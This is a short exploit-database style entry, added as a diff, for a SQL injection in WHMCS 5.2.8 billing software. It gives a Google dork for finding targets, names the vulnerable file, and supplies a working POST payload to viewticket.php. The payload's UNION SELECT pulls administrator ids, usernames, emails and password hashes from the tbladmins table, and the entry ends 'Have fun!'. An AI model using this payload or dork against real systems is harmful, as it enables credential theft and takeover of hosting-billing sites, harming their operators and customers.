@@ -1,0 +1,23 @@
+# Exploit Title: WHMCS 5.2.8 SQL Injection
+# Google Dork: "powered by WHMCS"
+# Date: 10/18/2013
+# Exploit Author: g00n ( Xploiter.net )
+# Vendor Homepage: http://www.whmcs.com/
+# Software Link: http://www.whmcs.com/
+# Version: 5.2.8
+# Tested on: Windows, Linux
+
+Vulnerable file: /includes/dbfunctions.php
+
+POC:
+
+select_query() function is vulnerable due to Register Globals
+
+Example:
+
+/whmcs/viewticket.php
+
+POST: tid[sqltype]=TABLEJOIN&tid[value]=-1 union select 1,0,0,0,0,0,0,0,0,0,0,(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins),0,0,0,0,0,0,0,0,0,0,0#
+
+
+Have fun!
